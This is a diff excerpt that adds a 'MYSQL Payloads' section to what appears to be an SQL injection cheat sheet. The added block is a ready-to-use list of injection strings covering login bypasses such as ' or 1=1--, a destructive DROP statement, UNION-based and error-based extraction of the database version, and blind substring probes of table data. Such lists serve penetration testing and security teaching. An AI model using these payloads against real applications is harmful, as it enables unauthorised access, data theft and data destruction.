@@ -31,6 +31,26 @@
 /* comment goes here */
 ```
 
+## MYSQL Payloads
+
+```
+'OR '1'='1
+-- -
+admin'--
+10;DROP members --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+UNION ALL SELECT NULL,version()--
+AND extractvalue(rand(),concat(0x3a,version()))--
+AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
+
+```
+
 ## MSSQL User
 
 ```sql
